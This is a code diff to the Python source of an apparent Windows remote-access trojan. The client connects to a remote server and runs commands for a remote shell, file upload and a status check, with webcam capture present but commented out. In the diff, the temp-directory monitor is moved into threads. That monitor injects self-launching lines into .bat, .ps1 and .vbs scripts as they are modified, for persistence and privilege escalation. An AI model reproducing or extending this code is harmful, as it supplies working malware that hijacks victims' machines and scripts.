@@ -18,6 +18,23 @@ import win32file
 # from cv2 import VideoCapture, imwrite
 # import win32api
 import win32con
+import inspect
+import ctypes
+def _async_raise(tid, exctype):
+  """raises the exception, performs cleanup if needed"""
+  tid = ctypes.c_long(tid)
+  if not inspect.isclass(exctype):
+    exctype = type(exctype)
+  res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
+  if res == 0:
+    raise ValueError("invalid thread id")
+  elif res != 1:
+    # """if it returns a number greater than one, you're in trouble,
+    # and you should call it again with exc=NULL to revert the effect"""
+    ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
+    raise SystemError("PyThreadState_SetAsyncExc failed")
+def stop_thread(thread):
+  _async_raise(thread.ident, SystemExit)
 # import win32gui
 # import win32ui
 # def handler(ip, port):
@@ -32,6 +49,9 @@ import win32con
 #     except socket.error as msg:
 #         sys.exit(1)
 def PINGPONG_client(ip, port):
+    global t_p
+    t_p = threading.Thread(target=PINGPONG_client_T, args=(ip, port))
+def PINGPONG_client_T(ip, port):
     try:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,80 +66,89 @@ def PINGPONG_client(ip, port):
                 s.close()
                 CMD_client(ip, cmd_port, port)
                 break
-            if data.decode() == "PRO_VBP_APP":
-                s.send(bytes("OK", 'utf8'))
-                PINGPONG = os.path.abspath(__file__)
-                FILE_MODIFIED = 3
-                FILE_LIST_DIRECTORY = 0x0001
-                CMD = f'{PINGPONG}'
-                FILE_TYPES = {
-                    '.bat': ["\r\nREM PIPO\r\n", f'\r\n{CMD}\r\n'],
-                    '.ps1': ["\r\n#PIPO\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
-                    '.vbs': ["\r\n'PIPO\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
-                }
+            elif data.decode() == "PRO_VBP_APP":
+                def moni_t():
+                    s.send(bytes("OK", 'utf8'))
+                    PINGPONG = os.path.abspath(__file__)
+                    FILE_MODIFIED = 3
+                    FILE_LIST_DIRECTORY = 0x0001
+                    CMD = f'{PINGPONG}'
+                    FILE_TYPES = {
+                        '.bat': ["\r\nREM PIPO\r\n", f'\r\n{CMD}\r\n'],
+                        '.ps1': ["\r\n#PIPO\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+                        '.vbs': ["\r\n'PIPO\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
+                    }
 
-                PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]
+                    PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]
 
-                def inject_code(full_filename, contents, extension):
-                    if FILE_TYPES[extension][0].strip() in contents:
-                        return
-                    
-                    full_contents = FILE_TYPES[extension][0]
-                    full_contents += FILE_TYPES[extension][1]
-                    full_contents += contents
-                    with open(full_filename, 'w') as f:
-                        f.write(full_contents)
-                    s.send(b'OK')
-                    s.close()
-                def monitor(path_to_watch):
-                    h_directory = win32file.CreateFile(
-                        path_to_watch,
-                        FILE_LIST_DIRECTORY,
-                        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
-                        None,
-                        win32con.OPEN_EXISTING,
-                        win32con.FILE_FLAG_BACKUP_SEMANTICS,
-                        None
-                        )
-
-                    while True:
-                        try:
-                            results = win32file.ReadDirectoryChangesW(
-                                h_directory,
-                                1024,
-                                True,
-                                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
-                                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
-                                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
-                                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
-                                win32con.FILE_NOTIFY_CHANGE_SECURITY |
-                                win32con.FILE_NOTIFY_CHANGE_SIZE,
-                                None,
-                                None
+                    def inject_code(full_filename, contents, extension):
+                        if FILE_TYPES[extension][0].strip() in contents:
+                            return
+                        
+                        full_contents = FILE_TYPES[extension][0]
+                        full_contents += FILE_TYPES[extension][1]
+                        full_contents += contents
+                        with open(full_filename, 'w') as f:
+                            f.write(full_contents)
+                        s.send(b'OK')
+                        s.close()
+                        stop_thread(t_p)
+                        stop_thread(t_m)
+                    def monitor(path_to_watch):
+                        h_directory = win32file.CreateFile(
+                            path_to_watch,
+                            FILE_LIST_DIRECTORY,
+                            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
+                            None,
+                            win32con.OPEN_EXISTING,
+                            win32con.FILE_FLAG_BACKUP_SEMANTICS,
+                            None
                             )
-                            for action, file_name in results:
-                                full_filename = os.path.join(path_to_watch, file_name)
-                                if action == FILE_MODIFIED:
-                                    s.send(bytes(str(full_filename), "utf8"))
-                                    check_data = s.recv(1024)
-                                    if check_data:
-                                        extension = os.path.splitext(full_filename)[1]
-                                        if extension in FILE_TYPES:     
-                                            try:
-                                                with open(full_filename) as f:
-                                                    contents = f.read()
-                                                inject_code(full_filename, contents, extension)
-                                                # print(contents)
-                                            except Exception as e:
-                                                pass
-                        except KeyboardInterrupt:
-                            break
-                    
-                        except Exception:
-                            pass
-                for path in PATHS:
-                    monitor_thread = threading.Thread(target=monitor, args=(path,))
-                    monitor_thread.start()
+
+                        while True:
+                            try:
+                                results = win32file.ReadDirectoryChangesW(
+                                    h_directory,
+                                    1024,
+                                    True,
+                                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
+                                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
+                                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
+                                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
+                                    win32con.FILE_NOTIFY_CHANGE_SECURITY |
+                                    win32con.FILE_NOTIFY_CHANGE_SIZE,
+                                    None,
+                                    None
+                                )
+                                for action, file_name in results:
+                                    full_filename = os.path.join(path_to_watch, file_name)
+                                    if action == FILE_MODIFIED:
+                                        s.send(bytes(str(full_filename), "utf8"))
+                                        check_data = s.recv(1024)
+                                        if check_data:
+                                            extension = os.path.splitext(full_filename)[1]
+                                            if extension in FILE_TYPES:     
+                                                try:
+                                                    with open(full_filename) as f:
+                                                        contents = f.read()
+                                                    inject_code(full_filename, contents, extension)
+                                                    # print(contents)
+                                                except Exception as e:
+                                                    pass
+                            except KeyboardInterrupt:
+                                break
+                        
+                            except Exception:
+                                pass
+                    for path in PATHS:
+                        monitor_thread = threading.Thread(target=monitor, args=(path,))
+                        monitor_thread.start()
+                t_m = threading.Thread(target=moni_t)
+                while True:
+                    e_data = s.recv(1024)
+                    if e_data.decode() == "EXIT":
+                        stop_thread(t_m)
+                        break
             # if data.decode() == "CAM_SHOT_APP":
             #     os.mkdir("./temp")
             #     s.send(bytes("OK", 'utf8'))
@@ -140,12 +169,12 @@ def PINGPONG_client(ip, port):
             #     shutil.rmtree("./temp")
             #     if re_check:
             #         continue
-            if data.decode() == "EXIT_APP":
+            elif data.decode() == "EXIT_APP":
                 s.close()
                 break
-            if data.decode() == "CHECK_APP":
+            elif data.decode() == "CHECK_APP":
                 s.send(bytes("OK", "utf8"))
-            if data.decode() == "UPLOAD_APP":
+            elif data.decode() == "UPLOAD_APP":
                 is_named = False
                 s.send(bytes("OK", 'utf8'))
                 dir_data = s.recv(1024).decode()
